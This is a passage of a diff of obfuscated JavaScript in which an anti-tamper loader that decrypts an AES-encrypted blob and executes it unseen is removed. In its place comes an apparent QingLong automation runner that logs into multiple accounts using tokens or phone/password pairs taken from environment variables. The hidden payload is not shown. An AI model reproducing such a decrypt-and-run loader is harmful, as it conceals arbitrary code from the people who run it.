-    let _0x49c9fc = [];
-    let _0x55824a = 0;
-    let _0x5a752e = null;
-    let _0x1aebc6 = 0;
-    let _0x185d07 = true;
-    let _0x321cb8 = Date.now();
+  async ["executeAccountTask"](_0x237b1b, _0x425d55, _0x22a544) {
+    let _0xfed1ce = {
+      "备注": _0x22a544,
+      "手机号": _0x237b1b,
+      "类型": "账号密码登录",
+      "状态": "❌ 失败",
+      "原因": ""
+    };
     try {
-      while (_0x55824a < _0x1193b4.length) {
-        {
-          let _0x3db3a5 = _0x1193b4[_0x55824a++];
-          if (_0x3db3a5 === 160) {
-            let _0x5523e0 = _0x1193b4[_0x55824a++];
-            if (_0x55824a < _0x1193b4.length) {
+      const _0xff20c2 = await this.loginByAccountPwd(_0x237b1b, _0x425d55, _0x22a544),
+        _0x3d9451 = await this.executeTokenTask(_0xff20c2, _0x22a544);
+      _0xfed1ce["状态"] = _0x3d9451["状态"];
+      _0xfed1ce["原因"] = _0x3d9451["原因"];
+      return _0xfed1ce;
+    } catch (_0x48365d) {
+      this.log("💥 异常: " + _0x48365d.message, "ERROR", _0x22a544);
+      _0xfed1ce["原因"] = _0x48365d.message;
+      return _0xfed1ce;
+    }
+  }
+  ["displayResults"]() {
+    if (this.results.length === 0) {
+      this.log("没有可显示的结果", "WARN");
+      return;
+    }
+    const _0x2ea52b = new Set();
+    this.results.forEach(_0xb95061 => Object.keys(_0xb95061).forEach(_0x3d5500 => _0x2ea52b.add(_0x3d5500)));
+    const _0x1d190b = Array.from(_0x2ea52b),
+      _0x5d8d8b = _0x1d190b.map(_0x1961c5 => {
+        const _0x1f8201 = Math.max(...this.results.map(_0x51a3f6 => String(_0x51a3f6[_0x1961c5] || "").length));
+        return Math.max(_0x1961c5.length, _0x1f8201) + 2;
+      }),
+      _0x304840 = _0x5d8d8b.map(_0xb17d2 => "-".repeat(_0xb17d2)).join("+");
+    console.log("\n" + _0x304840);
+    let _0x1f45df = "";
+    _0x1d190b.forEach((_0x4c0e64, _0x3e44bb) => {
+      _0x1f45df += _0x4c0e64.padEnd(_0x5d8d8b[_0x3e44bb] - 1) + "|";
+    });
+    console.log(_0x1f45df);
+    console.log(_0x304840);
+    this.results.forEach(_0x835920 => {
+      let _0x4c6115 = "";
+      _0x1d190b.forEach((_0x2a9953, _0x1d9d0b) => {
+        const _0x4d0070 = String(_0x835920[_0x2a9953] || "");
+        let _0xe8638c = _0x4d0070;
+        if (_0x4d0070.includes("✅")) _0xe8638c = "[32m" + _0x4d0070 + "[0m";
+        if (_0x4d0070.includes("❌")) _0xe8638c = "[31m" + _0x4d0070 + "[0m";
+        _0x4c6115 += _0xe8638c.padEnd(_0x5d8d8b[_0x1d9d0b] - 1) + "|";
+      });
+      console.log(_0x4c6115);
+    });
+    console.log(_0x304840 + "\n");
+  }
+  async ["run"]() {
+    try {
+      {
+        const _0x5c57d0 = this.ZXSH_NICKNAMES ? this.ZXSH_NICKNAMES.split("-").map(_0x5b6a0f => _0x5b6a0f.trim()) : [];
+        if (this.ZXSH) {
+          {
+            const _0x45cc06 = this.ZXSH.split(/\r?\n|&/).map(_0x2ff338 => _0x2ff338.trim()).filter(_0x2fd320 => _0x2fd320);
+            if (_0x45cc06.length > 0) {
               {
-                _0x1193b4[_0x55824a] = _0x1193b4[_0x55824a] ^ _0x5523e0;
-              }
-            }
-          } else {
-            if (_0x3db3a5 === 77) {
-              _0x55824a >= 5 && (_0x1193b4[_0x55824a - 2] = 0);
-            } else {
-              if (_0x3db3a5 === 108) {
-                {
-                  _0x49c9fc.push(_0x1193b4[_0x55824a++]);
-                }
-              } else {
-                if (_0x3db3a5 === 133) {
-                  if (_0x49c9fc.length) {
-                    _0x49c9fc.pop();
-                  }
-                } else {
-                  if (_0x3db3a5 === 165) {
-                    const _0x1cf254 = _0x1e3db4();
-                    const _0x33bf48 = _0x15464a.createHash("sha256").update(_0x1cf254).digest();
-                    _0x318c5f.dbg && _0x33bf48.toString("hex") !== _0x2536f1 && (_0x185d07 = false);
-                    _0x477ab6.push(_0x33bf48);
-                  } else {
-                    if (_0x3db3a5 === 137) {
-                      try {
-                        {
-                          let _0x5bf729 = _0x4de354.readFileSync(__filename, "utf8");
-                          if (_0x5bf729.charCodeAt(0) === 65279) {
-                            _0x5bf729 = _0x5bf729.slice(1);
-                          }
-                          const _0x4e1994 = Buffer.from(_0x247575, "base64").toString("utf8");
-                          if (_0x5bf729.indexOf(_0x4e1994) === -1) {
-                            {
-                              _0x185d07 = false;
-                            }
-                          }
-                          let _0x50218d = _0x5bf729.indexOf("*/");
-                          if (_0x50218d === -1) {
-                            throw new Error();
-                          }
-                          let _0x3ed075 = _0x5bf729.slice(0, _0x50218d + 2).replace(/[\r\n\s]/g, "");
-                          const _0x49617a = _0x15464a.createHash("sha256").update(_0x3ed075).digest();
-                          _0x318c5f.dbg && _0x49617a.toString("hex") !== _0x3c1ab5 && (_0x185d07 = false);
-                          _0x477ab6.push(_0x49617a);
-                        }
-                      } catch (_0x47d181) {
-                        _0x185d07 = false;
-                        _0x477ab6.push(Buffer.alloc(32));
-                      }
-                    } else {
-                      if (_0x3db3a5 === 178) {
-                        {
-                          let _0x535608 = _0x477ab6.pop();
-                          let _0x33d573 = _0x477ab6.pop();
-                          if (!_0x33d573 || !_0x535608) {
-                            _0x185d07 = false;
-                            continue;
-                          }
-                          let _0x3352a4 = Buffer.alloc(32);
-                          for (let _0x1d9548 = 0; _0x1d9548 < 32; _0x1d9548++) {
-                            _0x3352a4[_0x1d9548] = _0x33d573[_0x1d9548] ^ _0x535608[_0x1d9548];
-                          }
-                          _0x5a752e = _0x3352a4;
-                        }
-                      } else {
-                        if (_0x3db3a5 === 32) {
-                          {
-                            _0x5a752e && _0x1aebc6 < 32 ? (_0x5a752e[_0x1aebc6] ^= _0x1193b4[_0x55824a++], _0x1aebc6++) : _0x55824a++;
-                          }
-                        } else {
-                          if (_0x3db3a5 === 5) {
-                            {
-                              return {
-                                key: _0x5a752e,
-                                safe: _0x185d07
-                              };
-                            }
-                          }
-                        }
-                      }
+                this.log("==== 启动Token登录任务 ====", "CHECK");
+                this.log("共检测到 " + _0x45cc06.length + " 个Token", "INFO");
+                for (let _0x52122f = 0; _0x52122f < _0x45cc06.length; _0x52122f++) {
+                  {
+                    let _0x49b0ee = _0x45cc06[_0x52122f];
+                    if (_0x49b0ee.split("#").length > 1) {
+                      _0x49b0ee = _0x49b0ee.split("#")[0];
                     }
+                    const _0x18217e = _0x5c57d0[_0x52122f] || "Token" + (_0x52122f + 1),
+                      _0x36e911 = await this.executeTokenTask(_0x49b0ee, _0x18217e);
+                    this.results.push(_0x36e911);
+                    this.log("-".repeat(50), "INFO");
                   }
                 }
               }
             }
           }
         }
-      }
-    } catch (_0x3063ad) {
-      _0x4c76b9();
-    }
-    return null;
-  }
-  try {
-    const _0x4bc276 = _0x270f35(_0x7633a7);
-    (!_0x4bc276 || !_0x4bc276.safe) && _0x4c76b9();
-    try {
-      const _0x359639 = _0x49fd3b.join(__dirname, _0x318c5f.token);
-      const _0x4772de = _0x49fd3b.join(__dirname, _0x318c5f.daemon);
-      if (_0x4de354.existsSync(_0x359639)) {
-        _0x4de354.unlinkSync(_0x359639);
-      }
-    } catch (_0x26012b) {}
-    let _0x9f720;
-    try {
-      {
-        const _0x2894f0 = _0x15464a.createDecipheriv("aes-256-cbc", _0x4bc276.key, _0x3ead2b);
-        _0x9f720 = _0x2894f0.update(_0x575797, "hex", "utf8");
-        _0x9f720 += _0x2894f0.final("utf8");
-      }
-    } catch (_0x1d78a4) {
-      _0x4c76b9();
-    }
-    const _0x51439a = _0x139985.runInThisContext(_0x9f720);
-    _0x51439a(exports, require, module, __filename, __dirname);
-  } catch (_0x200d99) {
-    {
-      if (_0x200d99 instanceof SyntaxError) {
-        _0x4c76b9();
-      } else {
-        if (_0x318c5f.dbg) {
-          console.error(_0x200d99);
+        if (this.ZXSHZM) {
+          const _0x57c09e = this.ZXSHZM.split(/\r?\n|&/).map(_0x3de3be => _0x3de3be.trim()).filter(_0x2268f3 => _0x2268f3 && _0x2268f3.includes("#"));
+          if (_0x57c09e.length > 0) {
+            this.log("==== 启动账号密码登录任务 ====", "CHECK");
+            this.log("共检测到 " + _0x57c09e.length + " 个账号", "INFO");
+            const _0x4a09d1 = this.ZXSH ? this.ZXSH.split(/\r?\n|&/).filter(_0x224874 => _0x224874).length : 0;
+            for (let _0x2a0101 = 0; _0x2a0101 < _0x57c09e.length; _0x2a0101++) {
+              const [_0x1066db, _0x32d4df] = _0x57c09e[_0x2a0101].split("#");
+              if (!_0x1066db || !_0x32d4df) {
+                this.log("账号行格式错误，跳过：" + _0x57c09e[_0x2a0101], "WARN");
+                continue;
+              }
+              const _0x3a3674 = _0x5c57d0[_0x4a09d1 + _0x2a0101] || "账号" + (_0x2a0101 + 1),
+                _0x1ec4a6 = await this.executeAccountTask(_0x1066db.trim(), _0x32d4df.trim(), _0x3a3674);
+              this.results.push(_0x1ec4a6);
+              this.log("-".repeat(50), "INFO");
+            }
+          }
         }
+        if (this.results.length === 0) throw new Error("未配置有效的ZXSH（token）或ZXSHZM（账号密码）！");
+        this.log("==== 所有任务执行完成 ====", "CHECK");
+        this.displayResults();
       }
+    } catch (_0x30efe5) {
+      this.log("💥 整体执行失败: " + _0x30efe5.message, "ERROR");
     }
   }
+}
+(async () => {
+  const _0x2d45e4 = new QLZxshRunner();
+  await _0x2d45e4.run();
 })();
